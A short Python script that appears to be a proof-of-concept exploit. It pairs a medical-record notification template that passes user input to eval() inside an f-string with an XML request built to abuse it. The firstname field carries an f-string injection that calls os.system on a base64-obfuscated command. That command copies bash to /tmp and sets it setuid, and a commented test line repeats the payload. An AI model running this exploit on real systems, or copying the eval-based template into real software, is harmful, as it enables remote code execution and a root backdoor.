import re
from datetime import datetime
import xml.etree.ElementTree as ET, os

def template(first, last, sender, ts, dob, gender):
    pattern = re.compile(r"^[a-zA-Z0-9._'\"(){}=+/]+$")
    for s in [first, last, sender, ts, dob, gender]:
        if not pattern.fullmatch(s):
            return "[INVALID_INPUT]"
    # DOB format is DD/MM/YYYY
    try:
        year_of_birth = int(dob.split('/')[-1])
        if year_of_birth < 1900 or year_of_birth > datetime.now().year:
            return "[INVALID_DOB]"
    except:
        return "[INVALID_DOB]"
    template = f"Patient {first} {last} ({gender}), {{datetime.now().year - year_of_birth}} years old, received from {sender} at {ts}"
    try:
        return eval(f"f'''{template}'''")
    except Exception as e:
        return f"[EVAL_ERROR] {e}"

# print(template("{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}","a","a","a","12/12/1901", "a"))

xmlreq = '''<patient>
  <firstname>{__import__('os').system(__import__('base64').b64decode('Y3AgL2Jpbi9iYXNoIC90bXAvYmFzaDsgY2htb2QgK3MgL3RtcC9iYXNoOw=='))}</firstname>
  <lastname>a</lastname>
  <sender_app>a</sender_app>
  <timestamp>a</timestamp>
  <birth_date>12/12/1901</birth_date>
  <gender>a</gender>
</patient>'''

def receive():
    try:
        xml_root = ET.fromstring(xmlreq)
    except ET.ParseError:
        return "XML ERROR\n", 400
    patient = xml_root if xml_root.tag=="patient" else xml_root.find("patient")
    if patient is None:
        return "No <patient> tag found\n", 400
    data = {tag: (patient.findtext(tag) or "") for tag in ["firstname","lastname","sender_app","timestamp","birth_date","gender"]}
    print(data["firstname"])
    notification = template(data["firstname"],data["lastname"],data["sender_app"],data["timestamp"],data["birth_date"],data["gender"])
    return notification

print(receive())